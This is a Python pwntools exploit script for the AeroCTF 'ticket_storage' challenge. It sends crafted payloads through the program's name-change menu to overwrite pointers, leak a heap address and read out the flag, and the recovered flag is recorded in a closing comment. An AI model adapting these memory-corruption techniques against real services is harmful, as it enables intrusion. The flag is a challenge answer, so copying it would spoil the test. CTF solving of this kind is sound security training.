import pwn

HOST, PORT = 'tasks.aeroctf.com', 33014
DEBUG = False

if DEBUG:
    env = {'LD_PRELOAD': './libc.so.6'}
    p = pwn.process(['./ld-linux-x86-64.so.2', './ticket_storage'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc.so.6')


def Menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))


def Reserve():
    Menu(1)
    p.recvuntil('{?} Enter departure city: ')
    p.sendline('ironore15')
    p.recvuntil('{?} Enter destination city: ')
    p.sendline('ironore15')
    p.recvuntil('{?} Enter the desired cost: ')
    p.sendline('0')


def View(tid):
    Menu(2)
    p.recvuntil('{?} Enter ticket id: ')
    p.sendline(tid)
    p.recvuntil('From: ')
    f = p.recvline().strip()
    p.recvuntil('To: ')
    t = p.recvline().strip()
    p.recvuntil('Owner: ')
    o = p.recvline().strip()
    return f, t, o


p.recvuntil('{?} Enter name: ')
p.sendline('ironore15')

for i in range(8):
    Reserve()

Menu(5)
p.recvuntil('{?} Enter name: ')

payload = pwn.p64(0x4040F8)
payload += pwn.p64(0x404100)
payload += pwn.p64(0)
payload += pwn.p64(0x404120)
payload += pwn.p32(0)
payload += b'ABCDEFGH'
payload = payload.ljust(0x30, b'\x00')
payload = payload.ljust(0x80, b'A')
payload += pwn.p64(0x404120)
p.send(payload)

heap_leak, _, _ = View('ABCDEFGH')
heap_base = pwn.u64(heap_leak.ljust(8, b'\x00')) - 0x680
pwn.log.info('[heap]: 0x{:012X}'.format(heap_base))

Menu(5)
p.recvuntil('{?} Enter name: ')

payload = pwn.p64(heap_base + 0x4D0)
payload += pwn.p64(heap_base + 0x560)
payload += pwn.p64(0)
payload += pwn.p64(heap_base + 0x5F0)
payload += pwn.p32(0)
payload += b'ABCDEFGH'
payload = payload.ljust(0x30, b'\x00')
payload = payload.ljust(0x80, b'A')
payload += pwn.p64(0x404120)
p.send(payload)

_, flag, _ = View('ABCDEFGH')
flag = flag.decode()

Menu(6)

pwn.context.log_level = 'INFO'
p.close()

pwn.log.info(flag)

# Aero{4af2aea9b7dea9aabbc1c9a423e4957fd4c615821f4ded0f618b629651a9d67c}
